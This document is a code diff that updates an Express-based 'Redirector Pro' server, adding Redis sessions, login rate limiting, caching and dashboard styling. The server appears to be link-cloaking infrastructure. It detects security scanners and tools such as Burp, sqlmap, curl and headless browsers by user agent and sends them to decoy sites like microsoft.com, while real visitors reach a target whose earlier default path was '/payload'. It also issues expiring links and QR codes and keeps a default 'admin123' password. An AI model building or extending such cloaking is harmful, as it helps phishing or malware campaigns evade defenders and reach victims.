@@ -26,9 +26,12 @@ const app = express();
 const server = http.createServer(app);
 const io = new Server(server, {
   cors: {
-    origin: "*",
-    methods: ["GET", "POST"]
-  }
+    origin: process.env.CORS_ORIGIN ? process.env.CORS_ORIGIN.split(',') : "*",
+    methods: ["GET", "POST"],
+    credentials: true
+  },
+  pingTimeout: 60000,
+  pingInterval: 25000
 });
 
 app.set('trust proxy', 1);
@@ -36,23 +39,78 @@ app.use(compression({ level: 6, threshold: 0 }));
 app.use(morgan('combined'));
 app.use(express.static('public'));
 
+// ─── Session Store Configuration ────────────────────────────────────────────
+let sessionStore;
+let redisClient;
+
+// Check if Redis is configured (for production)
+if (process.env.REDIS_URL || process.env.REDIS_HOST) {
+  try {
+    const Redis = require('redis');
+    const RedisStore = require('connect-redis')(session);
+    
+    const redisConfig = {
+      url: process.env.REDIS_URL || `redis://${process.env.REDIS_HOST}:${process.env.REDIS_PORT || 6379}`,
+      password: process.env.REDIS_PASSWORD,
+      socket: {
+        reconnectStrategy: (retries) => Math.min(retries * 50, 1000)
+      }
+    };
+    
+    redisClient = Redis.createClient(redisConfig);
+    
+    redisClient.on('error', (err) => {
+      console.error('❌ Redis error:', err.message);
+      console.log('⚠️ Falling back to MemoryStore');
+      sessionStore = new session.MemoryStore();
+    });
+    
+    redisClient.on('connect', () => {
+      console.log('✅ Connected to Redis for session storage');
+      sessionStore = new RedisStore({ client: redisClient });
+    });
+    
+    redisClient.on('ready', () => {
+      console.log('✅ Redis client ready');
+    });
+    
+    redisClient.connect().catch(err => {
+      console.error('❌ Redis connection failed:', err.message);
+      sessionStore = new session.MemoryStore();
+    });
+    
+  } catch (err) {
+    console.log('⚠️ Redis modules not installed, using MemoryStore');
+    console.log('   Run: npm install redis connect-redis');
+    sessionStore = new session.MemoryStore();
+  }
+} else {
+  console.log('⚠️ Using MemoryStore - not suitable for production!');
+  console.log('   Set REDIS_URL environment variable for production session storage');
+  sessionStore = new session.MemoryStore();
+}
+
 // Session setup for admin UI
 app.use(session({
+  store: sessionStore,
   secret: process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex'),
   resave: false,
   saveUninitialized: false,
+  name: 'redirector.sid',
   cookie: { 
-    secure: process.env.NODE_ENV === 'production', 
-    maxAge: 24 * 60 * 60 * 1000,
+    secure: process.env.NODE_ENV === 'production' && process.env.HTTPS_ENABLED === 'true', 
+    maxAge: 24 * 60 * 60 * 1000, // 24 hours
     httpOnly: true,
-    sameSite: 'strict'
-  }
+    sameSite: 'lax',
+    path: '/'
+  },
+  rolling: true
 }));
 
 // ─── Config ──────────────────────────────────────────────────────────────────
-const TARGET_URL   = process.env.TARGET_URL   || 'https://example.invalid/payload';
+const TARGET_URL   = process.env.TARGET_URL   || 'https://example.com';
 const BOT_URLS     = process.env.BOT_URLS ? 
-  process.env.BOT_URLS.split(',') : [
+  process.env.BOT_URLS.split(',').map(url => url.trim()) : [
     'https://www.microsoft.com',
     'https://www.apple.com',
     'https://www.google.com',
@@ -65,13 +123,12 @@ const REQUEST_LOG_FILE = 'requests.log';
 const SUCCESS_LOG_FILE = 'success.log';
 const PORT         = process.env.PORT || 10000;
 
-// Admin credentials (should be set in environment variables)
+// Admin credentials
 const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'admin';
-// Generate a secure password hash: node -e "console.log(require('bcryptjs').hashSync('your-password', 10))"
 const ADMIN_PASSWORD_HASH = process.env.ADMIN_PASSWORD_HASH || 
-  bcrypt.hashSync('admin123', 10); // Change this in production!
+  bcrypt.hashSync('admin123', 10);
 
-// Parse TTL from environment variable (supports: 30m, 24h, 7d, 3600, etc.)
+// Parse TTL from environment variable
 function parseTTL(ttlValue) {
   const defaultTTL = 1800; // 30 minutes default
   
@@ -84,11 +141,11 @@ function parseTTL(ttlValue) {
   const unit = (match[2] || 'm').toLowerCase();
   
   switch(unit) {
-    case 's': return num;                    // seconds
-    case 'm': return num * 60;                // minutes to seconds
-    case 'h': return num * 3600;               // hours to seconds
-    case 'd': return num * 86400;               // days to seconds
-    default: return num * 60;                   // default to minutes
+    case 's': return Math.max(60, num); // Minimum 60 seconds
+    case 'm': return Math.max(1, num) * 60;
+    case 'h': return Math.max(1, num) * 3600;
+    case 'd': return Math.max(1, num) * 86400;
+    default: return Math.max(60, num * 60);
   }
 }
 
@@ -96,6 +153,7 @@ const LINK_TTL_SEC = parseTTL(process.env.LINK_TTL);
 const METRICS_API_KEY = process.env.METRICS_API_KEY || crypto.randomBytes(32).toString('hex');
 const IPINFO_TOKEN = process.env.IPINFO_TOKEN;
 const NODE_ENV = process.env.NODE_ENV || 'production';
+const MAX_LINKS = parseInt(process.env.MAX_LINKS) || 1000000;
 
 // Format TTL for display
 function formatDuration(seconds) {
@@ -114,13 +172,49 @@ function formatDuration(seconds) {
   return hours > 0 ? `${days} day${days !== 1 ? 's' : ''} ${hours} hour${hours !== 1 ? 's' : ''}` : `${days} day${days !== 1 ? 's' : ''}`;
 }
 
-// Cache instances
-const geoCache  = new NodeCache({ stdTTL: 86400, checkperiod: 3600, useClones: false });
-const linkCache = new NodeCache({ stdTTL: LINK_TTL_SEC, checkperiod: Math.min(300, Math.floor(LINK_TTL_SEC / 10)), useClones: false, maxKeys: 1000000 });
-const linkRequestCache = new NodeCache({ stdTTL: 60, checkperiod: 10, useClones: false });
-const failCache = new NodeCache({ stdTTL: 3600, checkperiod: 600, useClones: false });
-const deviceCache = new NodeCache({ stdTTL: 300, checkperiod: 60, useClones: false });
-const qrCache = new NodeCache({ stdTTL: 3600, checkperiod: 600, useClones: false });
+// Cache instances with optimized settings
+const geoCache  = new NodeCache({ 
+  stdTTL: 86400, 
+  checkperiod: 3600, 
+  useClones: false,
+  deleteOnExpire: true
+});
+
+const linkCache = new NodeCache({ 
+  stdTTL: LINK_TTL_SEC, 
+  checkperiod: Math.min(300, Math.floor(LINK_TTL_SEC / 10)), 
+  useClones: false, 
+  maxKeys: MAX_LINKS,
+  deleteOnExpire: true
+});
+
+const linkRequestCache = new NodeCache({ 
+  stdTTL: 60, 
+  checkperiod: 10, 
+  useClones: false,
+  deleteOnExpire: true 
+});
+
+const failCache = new NodeCache({ 
+  stdTTL: 3600, 
+  checkperiod: 600, 
+  useClones: false,
+  deleteOnExpire: true 
+});
+
+const deviceCache = new NodeCache({ 
+  stdTTL: 300, 
+  checkperiod: 60, 
+  useClones: false,
+  deleteOnExpire: true 
+});
+
+const qrCache = new NodeCache({ 
+  stdTTL: 3600, 
+  checkperiod: 600, 
+  useClones: false,
+  deleteOnExpire: true 
+});
 
 // ─── Stats Tracking ──────────────────────────────────────────────────────────
 const stats = {
@@ -135,11 +229,12 @@ const stats = {
   realtime: {
     lastMinute: [],
     activeLinks: 0,
-    requestsPerSecond: 0
+    requestsPerSecond: 0,
+    startTime: Date.now()
   }
 };
 
-// Socket.IO connection handling
+// Socket.IO connection handling with authentication
 io.use((socket, next) => {
   const token = socket.handshake.auth.token;
   if (token === METRICS_API_KEY) {
@@ -148,7 +243,7 @@ io.use((socket, next) => {
     next(new Error('Authentication error'));
   }
 }).on('connection', (socket) => {
-  console.log('Admin client connected:', socket.id);
+  console.log('📊 Admin client connected:', socket.id);
   
   // Send initial stats
   socket.emit('stats', stats);
@@ -156,26 +251,47 @@ io.use((socket, next) => {
     linkTTL: LINK_TTL_SEC,
     linkTTLFormatted: formatDuration(LINK_TTL_SEC),
     targetUrl: TARGET_URL,
-    botUrls: BOT_URLS
+    botUrls: BOT_URLS,
+    maxLinks: MAX_LINKS,
+    uptime: process.uptime()
   });
 
   socket.on('disconnect', () => {
-    console.log('Admin client disconnected:', socket.id);
+    console.log('📊 Admin client disconnected:', socket.id);
   });
 
   // Handle admin commands
   socket.on('command', async (cmd) => {
-    switch(cmd.action) {
-      case 'clearCache':
-        linkCache.flushAll();
-        geoCache.flushAll();
-        deviceCache.flushAll();
-        qrCache.flushAll();
-        socket.emit('notification', { type: 'success', message: 'Cache cleared' });
-        break;
-      case 'updateConfig':
-        // Handle config updates
-        break;
+    try {
+      switch(cmd.action) {
+        case 'clearCache':
+          linkCache.flushAll();
+          geoCache.flushAll();
+          deviceCache.flushAll();
+          qrCache.flushAll();
+          socket.emit('notification', { type: 'success', message: 'Cache cleared successfully' });
+          break;
+          
+        case 'getStats':
+          socket.emit('stats', stats);
+          break;
+          
+        case 'getConfig':
+          socket.emit('config', {
+            linkTTL: LINK_TTL_SEC,
+            linkTTLFormatted: formatDuration(LINK_TTL_SEC),
+            targetUrl: TARGET_URL,
+            botUrls: BOT_URLS,
+            maxLinks: MAX_LINKS,
+            nodeEnv: NODE_ENV
+          });
+          break;
+          
+        default:
+          socket.emit('notification', { type: 'error', message: 'Unknown command' });
+      }
+    } catch (err) {
+      socket.emit('notification', { type: 'error', message: err.message });
     }
   });
 });
@@ -200,12 +316,17 @@ setInterval(() => {
   io.emit('stats', stats);
 }, 1000);
 
+// Cleanup interval for old stats
+setInterval(() => {
+  stats.realtime.lastMinute = stats.realtime.lastMinute.slice(-60);
+}, 60000);
+
 // ─── Enhanced Device Detection ───────────────────────────────────────────────
 function getDeviceInfo(req) {
   const ua = req.headers['user-agent'] || '';
   
   // Check cache
-  const cacheKey = ua.substring(0, 100);
+  const cacheKey = crypto.createHash('md5').update(ua.substring(0, 200)).digest('hex');
   const cached = deviceCache.get(cacheKey);
   if (cached) return cached;
 
@@ -217,7 +338,9 @@ function getDeviceInfo(req) {
     brand: result.device.vendor || 'unknown',
     model: result.device.model || 'unknown',
     os: result.os.name || 'unknown',
+    osVersion: result.os.version || 'unknown',
     browser: result.browser.name || 'unknown',
+    browserVersion: result.browser.version || 'unknown',
     isMobile: false,
     isTablet: false,
     isBot: false,
@@ -226,11 +349,19 @@ function getDeviceInfo(req) {
 
   // Check for bots first
   const uaLower = ua.toLowerCase();
-  if (/headless|phantom|slurp|zgrab|scanner|bot|crawler|spider|burp|sqlmap|curl|wget|python|perl|ruby|go-http-client/i.test(uaLower)) {
+  const botPatterns = [
+    'headless', 'phantom', 'slurp', 'zgrab', 'scanner', 'bot', 'crawler', 
+    'spider', 'burp', 'sqlmap', 'curl', 'wget', 'python', 'perl', 'ruby', 
+    'go-http-client', 'java', 'okhttp', 'scrapy', 'httpclient', 'axios',
+    'node-fetch', 'php', 'libwww', 'wget', 'fetch', 'ahrefs', 'semrush'
+  ];
+  
+  if (botPatterns.some(pattern => uaLower.includes(pattern))) {
     deviceInfo.type = 'bot';
     deviceInfo.isBot = true;
     deviceInfo.score = 100;
     deviceCache.set(cacheKey, deviceInfo);
+    stats.byDevice.bot = (stats.byDevice.bot || 0) + 1;
     return deviceInfo;
   }
 
@@ -271,7 +402,10 @@ function getDeviceInfo(req) {
         deviceInfo.brand.includes('Samsung') || 
         deviceInfo.brand.includes('Huawei') ||
         deviceInfo.brand.includes('Xiaomi') ||
-        deviceInfo.brand.includes('Google')) {
+        deviceInfo.brand.includes('Google') ||
+        deviceInfo.brand.includes('OnePlus') ||
+        deviceInfo.brand.includes('Oppo') ||
+        deviceInfo.brand.includes('Vivo')) {
       deviceInfo.score -= 20;
     }
   }
@@ -285,12 +419,22 @@ function getDeviceInfo(req) {
 // ─── Middleware ──────────────────────────────────────────────────────────────
 app.use((req, res, next) => {
   req.id = crypto.randomBytes(8).toString('hex');
+  req.startTime = Date.now();
   req.deviceInfo = getDeviceInfo(req);
   res.locals.nonce = crypto.randomBytes(16).toString('hex');
   res.locals.startTime = Date.now();
   res.locals.deviceInfo = req.deviceInfo;
   res.setHeader('X-Request-ID', req.id);
   res.setHeader('X-Device-Type', req.deviceInfo.type);
+  res.setHeader('X-Response-Time', '0');
+  res.setHeader('X-Powered-By', 'Redirector-Pro');
+  
+  // Response time header
+  res.on('finish', () => {
+    const duration = Date.now() - req.startTime;
+    res.setHeader('X-Response-Time', duration + 'ms');
+  });
+  
   stats.totalRequests++;
   next();
 });
@@ -299,19 +443,23 @@ app.use(helmet({
   contentSecurityPolicy: {
     directives: {
       defaultSrc: ["'self'"],
-      scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`, 'https://cdn.socket.io'],
+      scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`, 'https://cdn.socket.io', 'https://cdn.jsdelivr.net'],
       styleSrc: ["'self'", "'unsafe-inline'", 'https://cdn.jsdelivr.net'],
       imgSrc: ["'self'", 'data:', 'https:'],
       connectSrc: ["'self'", 'ws:', 'wss:'],
       frameSrc: ["'none'"],
-      objectSrc: ["'none'"]
+      objectSrc: ["'none'"],
+      upgradeInsecureRequests: process.env.NODE_ENV === 'production' ? [] : null
     }
   },
   hsts: {
     maxAge: 31536000,
     includeSubDomains: true,
     preload: true
-  }
+  },
+  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
+  noSniff: true,
+  xssFilter: true
 }));
 
 app.use(express.json({ limit: '50kb' }));
@@ -320,7 +468,7 @@ app.use(express.urlencoded({ extended: true, limit: '50kb' }));
 // ─── Logging Helper ─────────────────────────────────────────────────────────
 async function logRequest(type, req, res, extra = {}) {
   try {
-    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || '??';
+    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || '0.0.0.0';
     const duration = res?.locals?.startTime ? Date.now() - res.locals.startTime : 0;
     
     const logEntry = {
@@ -330,17 +478,19 @@ async function logRequest(type, req, res, extra = {}) {
       ip: ip.substring(0, 15),
       device: req.deviceInfo.type,
       path: req.path,
-      d: duration,
+      method: req.method,
+      duration: duration,
       ...extra
     };
     
     // Emit log to admin clients
     io.emit('log', logEntry);
     
+    // Write to file asynchronously
     fs.appendFile(REQUEST_LOG_FILE, JSON.stringify(logEntry) + '\n').catch(() => {});
     
-    if (process.env.DEBUG) {
-      console.log(`[${type}] ${ip} ${req.path} ${JSON.stringify(extra)}`);
+    if (process.env.DEBUG === 'true') {
+      console.log(`[${type}] ${ip} ${req.method} ${req.path} (${duration}ms)`);
     }
   } catch (err) {
     // Silent fail
@@ -349,22 +499,32 @@ async function logRequest(type, req, res, extra = {}) {
 
 // ─── Health Endpoints ───────────────────────────────────────────────────────
 app.get(['/ping','/health','/healthz','/status'], (req, res) => {
-  res.status(200).json({
+  const healthData = {
     status: 'healthy',
     time: Date.now(),
     uptime: process.uptime(),
-    id: req.id
-  });
+    id: req.id,
+    memory: process.memoryUsage(),
+    stats: {
+      totalRequests: stats.totalRequests,
+      activeLinks: linkCache.keys().length,
+      botBlocks: stats.botBlocks
+    }
+  };
+  res.status(200).json(healthData);
 });
 
 // ─── Metrics Endpoint ────────────────────────────────────────────────────────
 app.get('/metrics', async (req, res) => {
-  const apiKey = req.headers['x-api-key'];
+  const apiKey = req.headers['x-api-key'] || req.query.key;
   if (apiKey !== METRICS_API_KEY) {
     return res.status(403).json({ error: 'Forbidden' });
   }
 
   const metrics = {
+    version: '3.0.0',
+    timestamp: Date.now(),
+    uptime: process.uptime(),
     links: linkCache.keys().length,
     caches: {
       geo: geoCache.keys().length,
@@ -372,9 +532,12 @@ app.get('/metrics', async (req, res) => {
       device: deviceCache.keys().length,
       qr: qrCache.keys().length
     },
-    uptime: process.uptime(),
-    memory: process.memoryUsage(),
-    time: Date.now(),
+    memory: {
+      rss: process.memoryUsage().rss,
+      heapTotal: process.memoryUsage().heapTotal,
+      heapUsed: process.memoryUsage().heapUsed,
+      external: process.memoryUsage().external
+    },
     totals: {
       requests: stats.totalRequests,
       blocks: stats.botBlocks,
@@ -386,7 +549,9 @@ app.get('/metrics', async (req, res) => {
     realtime: stats.realtime,
     config: {
       linkTTL: LINK_TTL_SEC,
-      linkTTLFormatted: formatDuration(LINK_TTL_SEC)
+      linkTTLFormatted: formatDuration(LINK_TTL_SEC),
+      maxLinks: MAX_LINKS,
+      nodeEnv: NODE_ENV
     }
   };
   
@@ -403,7 +568,7 @@ app.get('/admin/login', (req, res) => {
     <!DOCTYPE html>
     <html>
     <head>
-      <title>Admin Login - Redirector</title>
+      <title>Admin Login - Redirector Pro</title>
       <meta name="viewport" content="width=device-width, initial-scale=1">
       <style>
         *{margin:0;padding:0;box-sizing:border-box}
@@ -417,6 +582,7 @@ app.get('/admin/login', (req, res) => {
         button{width:100%;padding:1rem;background:linear-gradient(135deg,#667eea 0,#764ba2 100%);color:white;border:none;border-radius:8px;font-size:1rem;font-weight:600;cursor:pointer;transition:transform 0.2s}
         button:hover{transform:translateY(-2px)}
         .error{background:#fee;color:#c00;padding:0.75rem;border-radius:8px;margin-bottom:1rem;display:none}
+        .footer{text-align:center;margin-top:1rem;color:#999;font-size:0.9rem}
       </style>
     </head>
     <body>
@@ -426,14 +592,15 @@ app.get('/admin/login', (req, res) => {
         <form id="loginForm">
           <div class="form-group">
             <label>Username</label>
-            <input type="text" id="username" required>
+            <input type="text" id="username" placeholder="Enter username" required>
           </div>
           <div class="form-group">
             <label>Password</label>
-            <input type="password" id="password" required>
+            <input type="password" id="password" placeholder="Enter password" required>
           </div>
           <button type="submit">Login</button>
         </form>
+        <div class="footer">Redirector Pro v3.0</div>
       </div>
       <script>
         document.getElementById('loginForm').addEventListener('submit', async (e) => {
@@ -461,8 +628,22 @@ app.get('/admin/login', (req, res) => {
 
 app.post('/admin/login', express.json(), async (req, res) => {
   const { username, password } = req.body;
+  
+  // Rate limit login attempts
+  const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0] || 'unknown';
+  const attempts = linkRequestCache.get(`login:${ip}`) || 0;
+  
+  if (attempts >= 5) {
+    return res.status(429).json({ error: 'Too many login attempts. Try again later.' });
+  }
+  
+  linkRequestCache.set(`login:${ip}`, attempts + 1, 300); // 5 minute cooldown
+  
   if (username === ADMIN_USERNAME && await bcrypt.compare(password, ADMIN_PASSWORD_HASH)) {
     req.session.authenticated = true;
+    req.session.user = username;
+    req.session.loginTime = Date.now();
+    linkRequestCache.del(`login:${ip}`);
     res.json({ success: true });
   } else {
     res.status(401).json({ error: 'Invalid credentials' });
@@ -479,62 +660,71 @@ app.get('/admin', (req, res) => {
     <!DOCTYPE html>
     <html>
     <head>
-      <title>Redirector Admin Dashboard</title>
+      <title>Redirector Pro - Admin Dashboard</title>
       <meta name="viewport" content="width=device-width, initial-scale=1">
       <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
       <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
       <style>
         *{margin:0;padding:0;box-sizing:border-box}
         body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f5f5f5}
-        .navbar{background:linear-gradient(135deg,#667eea 0,#764ba2 100%);color:white;padding:1rem 2rem;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap}
-        .nav-links button{background:rgba(255,255,255,0.2);border:1px solid rgba(255,255,255,0.3);color:white;padding:0.5rem 1rem;border-radius:4px;cursor:pointer;margin-left:0.5rem}
+        .navbar{background:linear-gradient(135deg,#667eea 0,#764ba2 100%);color:white;padding:1rem 2rem;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
+        .nav-links button{background:rgba(255,255,255,0.2);border:1px solid rgba(255,255,255,0.3);color:white;padding:0.5rem 1rem;border-radius:4px;cursor:pointer;margin-left:0.5rem;transition:all 0.2s}
+        .nav-links button:hover{background:rgba(255,255,255,0.3);transform:translateY(-2px)}
         .container{padding:2rem;max-width:1400px;margin:0 auto}
         .stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:1.5rem;margin-bottom:2rem}
-        .stat-card{background:white;padding:1.5rem;border-radius:12px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
+        .stat-card{background:white;padding:1.5rem;border-radius:12px;box-shadow:0 2px 10px rgba(0,0,0,0.1);transition:transform 0.2s}
+        .stat-card:hover{transform:translateY(-5px);box-shadow:0 5px 20px rgba(0,0,0,0.15)}
         .stat-card h3{color:#666;font-size:0.9rem;text-transform:uppercase;letter-spacing:1px;margin-bottom:0.5rem}
         .stat-card .value{font-size:2.5rem;font-weight:bold;color:#333}
         .stat-card .trend{color:#4caf50;font-size:0.9rem;margin-top:0.5rem}
         .chart-container{background:white;padding:1.5rem;border-radius:12px;margin-bottom:2rem;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
         .tabs{display:flex;gap:0.5rem;margin-bottom:1rem;flex-wrap:wrap}
-        .tab{background:none;border:none;padding:0.5rem 1rem;cursor:pointer;border-bottom:2px solid transparent;font-size:1rem}
-        .tab.active{border-bottom-color:#667eea;color:#667eea;font-weight:600}
+        .tab{background:white;border:none;padding:0.75rem 1.5rem;cursor:pointer;border-radius:8px;font-size:1rem;transition:all 0.2s;box-shadow:0 2px 4px rgba(0,0,0,0.1)}
+        .tab:hover{background:#f0f0f0}
+        .tab.active{background:linear-gradient(135deg,#667eea 0,#764ba2 100%);color:white;font-weight:600}
         .tab-content{display:none}
         .tab-content.active{display:block}
         .config-group{margin-bottom:1rem}
-        .config-group label{display:block;margin-bottom:0.5rem;color:#666}
-        .config-group input,.config-group textarea{width:100%;padding:0.75rem;border:2px solid #e0e0e0;border-radius:8px;font-family:monospace}
-        .config-group textarea{min-height:100px}
-        button{background:linear-gradient(135deg,#667eea 0,#764ba2 100%);color:white;border:none;padding:0.75rem 1.5rem;border-radius:8px;cursor:pointer;font-weight:600;transition:transform 0.2s;margin-right:0.5rem;margin-bottom:0.5rem}
-        button:hover{transform:translateY(-2px)}
+        .config-group label{display:block;margin-bottom:0.5rem;color:#666;font-weight:500}
+        .config-group input,.config-group textarea{width:100%;padding:0.75rem;border:2px solid #e0e0e0;border-radius:8px;font-family:monospace;transition:border-color 0.2s}
+        .config-group input:focus,.config-group textarea:focus{outline:none;border-color:#667eea}
+        .config-group textarea{min-height:100px;resize:vertical}
+        button{background:linear-gradient(135deg,#667eea 0,#764ba2 100%);color:white;border:none;padding:0.75rem 1.5rem;border-radius:8px;cursor:pointer;font-weight:600;transition:all 0.2s;margin-right:0.5rem;margin-bottom:0.5rem}
+        button:hover{transform:translateY(-2px);box-shadow:0 5px 15px rgba(102,126,234,0.4)}
         button.secondary{background:#6c757d}
+        button.secondary:hover{box-shadow:0 5px 15px rgba(108,117,125,0.4)}
         .button-group{display:flex;gap:1rem;flex-wrap:wrap}
-        .link-generator{background:white;padding:1.5rem;border-radius:12px;margin-bottom:2rem}
-        .qr-preview{max-width:200px;margin:1rem 0;border:1px solid #e0e0e0;border-radius:8px}
-        .notification{position:fixed;top:20px;right:20px;padding:1rem;border-radius:8px;color:white;animation:slideIn 0.3s ease;z-index:1000}
+        .link-generator{background:white;padding:1.5rem;border-radius:12px;margin-bottom:2rem;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
+        .qr-preview{max-width:200px;margin:1rem 0;border:1px solid #e0e0e0;border-radius:8px;padding:0.5rem}
+        .notification{position:fixed;top:20px;right:20px;padding:1rem;border-radius:8px;color:white;animation:slideIn 0.3s ease;z-index:1000;max-width:400px}
         .notification.success{background:#4caf50}
         .notification.error{background:#f44336}
+        .notification.info{background:#2196f3}
         @keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
         .loading{display:inline-block;width:20px;height:20px;border:3px solid #f3f3f3;border-top-color:#667eea;border-radius:50%;animation:spin 1s linear infinite}
         @keyframes spin{to{transform:rotate(360deg)}}
-        .log-container{background:#1e1e1e;color:#fff;padding:1rem;border-radius:8px;font-family:monospace;font-size:12px;height:500px;overflow-y:auto}
-        .log-entry{border-bottom:1px solid #333;padding:0.25rem 0}
+        .log-container{background:#1e1e1e;color:#fff;padding:1rem;border-radius:8px;font-family:monospace;font-size:12px;height:500px;overflow-y:auto;box-shadow:inset 0 2px 10px rgba(0,0,0,0.5)}
+        .log-entry{border-bottom:1px solid #333;padding:0.5rem 0;transition:background 0.2s}
+        .log-entry:hover{background:#2a2a2a}
         .log-time{color:#888}
-        .log-type{display:inline-block;padding:0.1rem 0.3rem;border-radius:3px;margin:0 0.5rem}
-        .log-type.success{background:#4caf50}
-        .log-type.block{background:#f44336}
-        .log-type.redirect{background:#2196f3}
+        .log-type{display:inline-block;padding:0.2rem 0.5rem;border-radius:4px;margin:0 0.5rem;font-weight:bold;font-size:10px}
+        .log-type.success{background:#4caf50;color:white}
+        .log-type.block{background:#f44336;color:white}
+        .log-type.redirect{background:#2196f3;color:white}
         .json-viewer{background:#f8f9fa;padding:0.5rem;border-radius:4px;font-family:monospace;font-size:11px;margin-top:0.5rem}
-        .country-badge{display:inline-block;padding:0.2rem 0.5rem;border-radius:4px;background:#e9ecef;margin:0.2rem}
+        .country-badge{display:inline-block;padding:0.2rem 0.5rem;border-radius:4px;background:#e9ecef;margin:0.2rem;font-size:0.9rem}
         @media (max-width: 768px) {
           .navbar{flex-direction:column;text-align:center}
           .nav-links{margin-top:1rem}
           .stats-grid{grid-template-columns:1fr}
+          .button-group{flex-direction:column}
+          button{width:100%}
         }
       </style>
     </head>
     <body>
       <div class="navbar">
-        <h1>🔗 Redirector Admin</h1>
+        <h1>🔗 Redirector Pro Admin</h1>
         <div class="nav-links">
           <button onclick="refreshData()">🔄 Refresh</button>
           <button onclick="logout()">🚪 Logout</button>
@@ -659,6 +849,10 @@ app.get('/admin', (req, res) => {
               <label>Metrics API Key</label>
               <input type="text" id="metricsApiKey" value="${METRICS_API_KEY}" readonly>
             </div>
+            <div class="config-group">
+              <label>Session Store</label>
+              <input type="text" id="sessionStore" value="${sessionStore.constructor.name}" readonly>
+            </div>
             <div class="button-group">
               <button onclick="saveConfig()">💾 Save Configuration</button>
               <button class="secondary" onclick="clearCache()">🗑️ Clear Cache</button>
@@ -698,7 +892,8 @@ app.get('/admin', (req, res) => {
 
       <script>
         const socket = io({
-          auth: { token: '${METRICS_API_KEY}' }
+          auth: { token: '${METRICS_API_KEY}' },
+          transports: ['websocket', 'polling']
         });
         
         let trafficChart, deviceChart, botChart, browserChart;
@@ -722,6 +917,14 @@ app.get('/admin', (req, res) => {
           }
         });
         
+        socket.on('connect', () => {
+          showNotification('Connected to real-time server', 'success');
+        });
+        
+        socket.on('disconnect', () => {
+          showNotification('Disconnected from real-time server', 'error');
+        });
+        
         function updateStats(data) {
           document.getElementById('totalRequests').textContent = data.totalRequests.toLocaleString();
           document.getElementById('activeLinks').textContent = data.realtime.activeLinks;
@@ -738,7 +941,7 @@ app.get('/admin', (req, res) => {
             const prev = data.realtime.lastMinute[data.realtime.lastMinute.length - 2] || {requests:0};
             const current = data.realtime.lastMinute[data.realtime.lastMinute.length - 1];
             const trend = prev.requests ? ((current.requests - prev.requests) / prev.requests * 100).toFixed(1) : 0;
-            document.getElementById('requestsTrend').textContent = trend + '% vs last minute';
+            document.getElementById('requestsTrend').textContent = (trend > 0 ? '+' : '') + trend + '% vs last minute';
           }
 
           // Update country stats
@@ -746,7 +949,7 @@ app.get('/admin', (req, res) => {
             .sort((a,b) => b[1] - a[1])
             .slice(0, 10)
             .map(([country, count]) => 
-              '<span class="country-badge">' + country + ': ' + count + '</span>'
+              '<span class="country-badge">' + country + ': ' + count.toLocaleString() + '</span>'
             ).join('');
           document.getElementById('countryStats').innerHTML = countryHtml || '<p>No country data yet</p>';
         }
@@ -770,7 +973,15 @@ app.get('/admin', (req, res) => {
               options: {
                 responsive: true,
                 animation: false,
-                scales: { y: { beginAtZero: true } }
+                scales: { 
+                  y: { 
+                    beginAtZero: true,
+                    ticks: { stepSize: 1 }
+                  } 
+                },
+                plugins: {
+                  legend: { display: false }
+                }
               }
             });
           }
@@ -874,7 +1085,7 @@ app.get('/admin', (req, res) => {
             document.getElementById('generationResult').style.display = 'block';
             
             if (generateQr) {
-              showNotification('Generating QR code...', 'success');
+              showNotification('Generating QR code...', 'info');
               
               let qrUrl = data.url;
               if (showQrPage) qrUrl += '?qr=true';
@@ -895,6 +1106,7 @@ app.get('/admin', (req, res) => {
         function copyToClipboard() {
           const url = document.getElementById('generatedUrl');
           url.select();
+          url.setSelectionRange(0, 99999);
           document.execCommand('copy');
           showNotification('URL copied to clipboard!');
         }
@@ -933,9 +1145,13 @@ app.get('/admin', (req, res) => {
         }
         
         async function clearCache() {
-          const res = await fetch('/admin/clear-cache', { method: 'POST' });
-          if (res.ok) {
-            showNotification('Cache cleared!', 'success');
+          if (confirm('Are you sure you want to clear all caches?')) {
+            const res = await fetch('/admin/clear-cache', { method: 'POST' });
+            if (res.ok) {
+              showNotification('Cache cleared!', 'success');
+            } else {
+              showNotification('Error clearing cache', 'error');
+            }
           }
         }
         
@@ -945,7 +1161,7 @@ app.get('/admin', (req, res) => {
         }
         
         function refreshData() {
-          socket.emit('command', { action: 'refresh' });
+          socket.emit('command', { action: 'getStats' });
         }
         
         function clearLogs() {
@@ -972,8 +1188,8 @@ app.get('/admin', (req, res) => {
                            log.type === 'block' ? 'block' : 'redirect';
           
           entry.innerHTML = '<span class="log-time">[' + time + ']</span> ' +
-                           '<span class="log-type ' + typeClass + '">' + log.type + '</span> ' +
-                           '<span>' + log.ip + ' ' + log.path + ' ' + log.device + '</span>';
+                           '<span class="log-type ' + typeClass + '">' + log.type.toUpperCase() + '</span> ' +
+                           '<span>' + log.ip + ' ' + log.path + ' (' + log.device + ')</span>';
           
           logContainer.insertBefore(entry, logContainer.firstChild);
           
@@ -994,8 +1210,13 @@ app.get('/admin', (req, res) => {
 
 // Logout
 app.post('/admin/logout', (req, res) => {
-  req.session.destroy();
-  res.json({ success: true });
+  req.session.destroy((err) => {
+    if (err) {
+      return res.status(500).json({ error: 'Logout failed' });
+    }
+    res.clearCookie('redirector.sid');
+    res.json({ success: true });
+  });
 });
 
 // Save config (requires authentication)
@@ -1033,7 +1254,7 @@ app.get('/admin/export-logs', async (req, res) => {
   try {
